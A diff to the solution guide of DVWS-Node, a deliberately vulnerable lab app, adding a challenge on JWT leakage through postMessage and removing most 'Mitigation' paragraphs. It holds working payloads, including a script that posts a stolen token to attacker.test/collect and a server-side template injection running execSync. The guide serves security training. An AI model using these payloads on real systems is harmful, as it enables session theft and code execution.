@@ -76,6 +76,7 @@ This guide walks through the deliberately vulnerable parts of DVWS-Node. It give
 56. [JWT JKU Key Source Trust](#56-jwt-jku-key-source-trust)
 57. [JWT KID Path Traversal](#57-jwt-kid-path-traversal)
 58. [Resource Store Promotion Timing Side Channel](#58-resource-store-promotion-timing-side-channel)
+59. [JWT Disclosure Through PostMessage](#59-jwt-disclosure-through-postmessage)
 
 ---
 
@@ -367,7 +368,6 @@ Content-Type: application/json
 
 The response reports the credited amount and new balance. `GET /api/v2/resource-store` shows the persisted balance and redemption. An unknown code is rejected; the same account cannot redeem a code twice. The ordinary release response and Resource Store catalogue do not disclose the code.
 
-**Mitigation:** Use a fixed XPath expression with the release value passed as data, or compare the release element text directly. Keep promotion codes in a store that cannot be queried through public diagnostic endpoints.
 
 ---
 
@@ -480,7 +480,6 @@ Export the saved profile with `POST /api/v2/users/profile/export/xml` and the sa
 
 Send `{"xml":"<exact export>","signature":"<X-Profile-Export-Signature>"}` to `POST /api/v2/users/profile/restore/xml` with the same bearer token. The restore response reports `admin: true`; signing in again gives the account administrator permissions. A hand-written XML document without the export signature is rejected. This is distinct from challenge 13's direct, unauthenticated import endpoint.
 
-**Mitigation:** Escape all user-controlled values when serializing XML, and reject duplicate security-sensitive fields on import. A valid signature authenticates the bytes produced by the exporter; it does not make those bytes safe to interpret.
 
 ---
 
@@ -1220,7 +1219,6 @@ Content-Type: application/json
 
 The wrong passwords return GraphQL authentication errors, while the matching password returns a JWT that works on `GET /api/v2/notes`. Expand the array to eleven guesses: the gateway still counts one HTTP request. Eleven separate POST requests from the same client receive HTTP 429 on the last request. The gateway currently trusts `X-Forwarded-For` for client identity, as described in challenge 30.
 
-**Mitigation:** Apply a login-attempt budget to each `userLogin` resolver execution, including every operation in a batch, and use a trusted client identity for rate limiting.
 
 ---
 
@@ -1471,7 +1469,7 @@ Require a CSRF token or equivalent request validation for state-changing endpoin
 
 ### Challenge
 
-Using the local HTTPS setup in challenge 41, sign into DVWS Cloud and select **Account → External access**. Set the partner origin to `https://partner.test:8443`, select one or more fields, and enable sharing. Then open `https://attacker.test:8443/attacker-lab.html?challenge=jsonp` in the same browser. The attacker origin is not the configured partner, yet its callback receives the selected fields when the browser sends the `auth_token` cookie. Reload Account to confirm the settings persist, then revoke sharing and reload the attacker fixture; the JSONP request should fail. Browser third-party-cookie restrictions may block the cookie.
+Using the local HTTPS setup in challenge 41, sign into DVWS and select **Account → External access**. Set the partner origin to `https://partner.test:8443`, select one or more fields, and enable sharing. Then open `https://attacker.test:8443/attacker-lab.html?challenge=jsonp` in the same browser. The attacker origin is not the configured partner, yet its callback receives the selected fields when the browser sends the `auth_token` cookie. Reload Account to confirm the settings persist, then revoke sharing and reload the attacker fixture; the JSONP request should fail. Browser third-party-cookie restrictions may block the cookie.
 
 ### Solution
 
@@ -1512,7 +1510,6 @@ socket.onmessage = (event) => {
 
 The `snapshot` contains the signed-in user's notifications. If an unread item exists, the script sends its ID and the server replies with a successful `read` message; Account → Notifications then shows that item as read. In the browser's Network panel, inspect the WebSocket handshake: its `Origin` is `https://attacker.test:8443`, while the browser supplies the DVWS `auth_token` cookie for the `dvws.local` connection. The attacker script cannot read the HttpOnly cookie; it does not need to, because the browser attaches it automatically. The server checks that cookie but accepts the handshake without checking `Origin`, which lets the attacker page use the victim's authenticated socket.
 
-**Mitigation:** Validate the WebSocket handshake `Origin` against an explicit allowlist before upgrading, and reject unexpected origins. Keep authentication and per-user authorization checks as well; cookie flags alone do not prevent cross-site WebSocket hijacking.
 
 ## 44. Server-Side Template Injection
 
@@ -1534,7 +1531,6 @@ GET /api/v2/greeter?name=%24%7B7*7%7D
 
 The response is `Hello 49`. The parameter is inserted into a newly compiled function as template source. For a controlled local lab, a command expression such as `${process.mainModule.require('child_process').execSync('id').toString()}` demonstrates the impact. Do not expose this deliberately vulnerable service to untrusted networks.
 
-**Mitigation:** Keep templates fixed and pass user input as escaped data. Never compile request values as template source.
 
 ## 45. Unsafe YAML Supplier Import
 
@@ -1578,7 +1574,6 @@ The output is `executed`, proving that the function tag was deserialized and inv
 
 The example is non-destructive, but the vulnerable parser can execute arbitrary JavaScript; the marker path does not sandbox it. Run this challenge only in an isolated lab.
 
-**Mitigation:** Use a data-only YAML schema, reject custom executable tags, validate each imported field, and never invoke functions supplied by an uploaded document.
 
 ## 46. Cross-Customer Monthly Statement Path Traversal
 
@@ -1611,7 +1606,6 @@ curl --get 'http://dvws.local/api/v2/reports/monthly' \
 
 The final response contains the victim account's email address and monthly order details, including the two API Monitor units. The report was generated from DVWS account and Resource Store data; the cache file is stored under the victim's account directory in the server's temporary report cache.
 
-**Mitigation:** Validate `period` as a strict year-month value, resolve the final path, and verify it remains beneath the authenticated user's report directory before reading it. Keep authenticated statements private in shared caches.
 
 ## 47. Notification Preference Mass Assignment
 
@@ -1636,7 +1630,6 @@ Content-Type: application/json
 
 The response shows `admin: true`. Log in again as that customer and request `/api/v2/users/checkadmin`; the new token has the administrator permission. Existing tokens retain the claims issued at login.
 
-**Mitigation:** Build updates from an allowlist of notification fields and keep role changes in a separately authorized workflow.
 
 ## 48. Undocumented TRACE Diagnostics
 
@@ -1656,7 +1649,6 @@ curl -X TRACE http://dvws.local/internal/diagnostics
 
 The response includes a build label, database connection state, and seeded account usernames, email addresses, and roles. The path does not appear in `/openAPI-spec.json`; method and path discovery therefore require inspecting the service behavior or source.
 
-**Mitigation:** Remove diagnostics handlers from public builds or require explicit operator authorization, and keep diagnostic output free of account data.
 
 ## 49. Legacy Login Skips Password Verification
 
@@ -1685,7 +1677,6 @@ curl http://dvws.local/api/v2/notes \
 
 V2 returns HTTP 401. V1 returns HTTP 200 and a token that can access the notes endpoint. An unknown username returns HTTP 404 from v1.
 
-**Mitigation:** Require password verification on every authentication path and retire the legacy handler. Test all supported login versions against incorrect credentials.
 
 ## 50. Excessive Activity Report Page Size
 
@@ -1718,7 +1709,6 @@ wc -c default.json large.json
 
 For a fresh account with one login and 50 saved notes, the first response contains 20 events and the second contains 51. The larger request reads more persisted documents and transfers more bytes; it does not invent rows to reach the requested limit. Event `subject` values refer to the saved note or order IDs. Invalid, nonpositive, and above-5,000 limits return HTTP 400; the ceiling is a lab safety bound.
 
-**Mitigation:** Enforce a small page-size cap, paginate results, and set response or resource budgets for expensive report operations.
 
 ---
 
@@ -1741,7 +1731,6 @@ curl -I http://dvws.local/api/v1/info
 
 Neither response sets `X-Frame-Options`, `Content-Security-Policy`, or `X-Content-Type-Options`; both include `X-Powered-By: Express`. This is a response header audit exercise.
 
-**Mitigation:** Set an appropriate Content Security Policy, `X-Content-Type-Options: nosniff`, and framing policy such as `X-Frame-Options` or CSP `frame-ancestors`. Remove the `X-Powered-By` header.
 
 ---
 
@@ -1768,7 +1757,6 @@ Use one GraphQL operation to request several username lookups. Compare the separ
 
 Send this as the `query` field in a JSON `POST /graphql` request. The response contains separate `first`, `second`, `third`, and `fourth` fields. The response alone does not count database queries: inspect `userSearchByUsername` in `src/graphql/schema.js`, which calls `User.find` each time the field is resolved. Add more uniquely named aliases to repeat that resolver within one HTTP request.
 
-**Mitigation:** Apply query complexity and depth limits, cap aliases or resolver calls per operation, and set request time and resource budgets.
 
 ## 53. Support Ticket IDOR via Exposed UUID
 
@@ -1805,7 +1793,6 @@ Authorization: Bearer <test-token>
 
 The response contains the seeded `recovery-victim` ticket even though the caller is `test`. A malformed UUID returns `400 Invalid ticket ID`; a well-formed unknown UUID returns `404 Support ticket not found`.
 
-**Mitigation:** Use unpredictable identifiers where that helps, and always enforce per-ticket authorization by checking that the authenticated user owns the requested record. Identifier format is not an authorization control.
 
 ---
 
@@ -1817,7 +1804,7 @@ The response contains the seeded `recovery-victim` ticket even though the caller
 
 ### Challenge
 
-Sign in to DVWS Cloud and open **Operations → Resource Store**. The wallet starts with 100 credits. Buy one API Monitor for 10 credits and inspect the request in the browser Network panel. Replay it with quantity `-1`:
+Sign in to DVWS and open **Operations → Resource Store**. The wallet starts with 100 credits. Buy one API Monitor for 10 credits and inspect the request in the browser Network panel. Replay it with quantity `-1`:
 
 ```http
 POST /api/v2/resource-store/orders HTTP/1.1
@@ -1830,7 +1817,6 @@ Content-Type: application/json
 
 The order response shows a 10-credit increase, restoring the balance to 100. **Recent orders** shows both the original purchase and the negative-quantity order. This proves that an order can be offset in the wallet ledger. The lab does not provision an API Monitor service or track item ownership, so it cannot show that a service was obtained for free.
 
-**Mitigation:** Validate quantity as a positive integer at the server boundary, derive prices from trusted catalogue data, and enforce balance constraints in the same atomic transaction as order creation.
 
 ## 55. Resource Store: Increase Your Balance by 1,000 Credits
 
@@ -1853,7 +1839,6 @@ Content-Type: application/json
 
 At 10 credits per item, the response shows a 1,000-credit increase. The order history records quantity `-100` and a positive 1,000-credit change. Zero, fractional, and out-of-range quantities and unknown item IDs are rejected. Wallets and orders are scoped to the authenticated user.
 
-**Mitigation:** Validate quantity as a positive integer at the server boundary, derive prices from trusted catalogue data, and enforce balance constraints in the same atomic transaction as order creation.
 
 ## 56. JWT JKU Key Source Trust
 
@@ -1912,7 +1897,6 @@ NODE
 
 The expected output is `Without token: 401; forged token: 200`.
 
-**Mitigation:** Bind each issuer to a server-configured key set or pinned keys. Do not let an untrusted token choose the key source; validate `iss`, `aud`, allowed algorithms, and key ID against trusted configuration. The fetch has a timeout and response-size limit, but trust in the token-selected key source remains intentionally vulnerable.
 
 ## 57. JWT KID Path Traversal
 
@@ -1932,7 +1916,6 @@ curl http://dvws.local/api/v2/users \
 
 Without authentication, `/api/v2/users` returns HTTP 401. With the forged token, the shared middleware accepts it and the endpoint returns stored user accounts, including password hashes. A token forged for a Resource Store customer can also read that account's wallet and orders. An incorrectly signed token returns HTTP 401. The selected file supplies signing-key material; its contents are not returned by the application.
 
-**Mitigation:** Treat `kid` as an identifier, not a path. Look it up in a fixed in-memory or configured key map; if files must be used, canonicalize the path and verify it remains beneath the key directory. Use high-entropy keys and pin the expected algorithm.
 
 ## 58. Resource Store Promotion Timing Side Channel
 
@@ -1958,7 +1941,35 @@ The solver sends several requests for each possible next hexadecimal character, 
 
 The lookup is vulnerable because it does extra work for matching prefixes. Repeated measurements separate that delay from normal request noise and reveal one character at a time.
 
-**Mitigation:** Do not perform different work based on a partially matching secret. Fetch a candidate by a nonsecret identifier, compare the complete code using a constant-time comparison, and apply a uniform response path for invalid codes. Avoid logging or returning secret codes and flags in diagnostic responses. Rate limits can reduce automated probing but do not replace removing the timing difference.
+
+## 59. JWT Disclosure Through PostMessage
+
+**UI:** Administration → Session token challenge
+
+**Description:** The administration page decodes the signed-in user's JWT locally and displays its header and claims for inspection. When the page is embedded by another window, it sends the raw token to the parent with `postMessage(..., '*')` without validating the target origin.
+
+### Challenge
+
+Create an attacker-controlled page that embeds the administration page and listens for `message` events. Capture the raw JWT sent by the embedded page, then decode it to identify the user, permissions, issuer, and expiration claims.
+
+### Solution
+
+```html
+<script>
+window.addEventListener('message', (event) => {
+  if (typeof event.data !== 'string') return;
+  console.log('stolen JWT:', event.data);
+  fetch('https://attacker.test/collect', {
+    method: 'POST',
+    body: event.data
+  });
+});
+</script>
+<iframe src="https://dvws.local/admin"></iframe>
+```
+
+Open the attacker page in the same browser session as an authenticated administrator. The iframe's page can read its own `localStorage` token and sends it to its attacker-controlled parent. Decode the captured token's first two sections as Base64URL JSON. The signature is not secret and decoding does not verify the token; the vulnerability is the cross-origin disclosure caused by the wildcard target origin.
+
 
 ## Appendix: Quick Reference
 
